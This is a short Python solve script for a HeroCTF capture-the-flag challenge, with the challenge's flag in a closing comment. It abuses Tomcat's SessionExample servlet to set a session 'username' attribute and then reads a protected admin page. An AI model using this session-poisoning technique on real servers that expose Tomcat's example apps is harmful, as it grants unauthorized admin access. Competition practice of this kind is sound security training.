import requests

chal = "http://dyn03.heroctf.fr:12256"
s = requests.Session()

s.get(f"{chal}/examples/servlets/servlet/SessionExample")
s.post(
    f"{chal}/examples/servlets/servlet/SessionExample",
    data={"dataname": "username", "datavalue": "darth_sidious"},
)

print(s.get(f"{chal}/dark/admin").text)

# Hero{a2ae73558d29c6d438353e2680a90692}
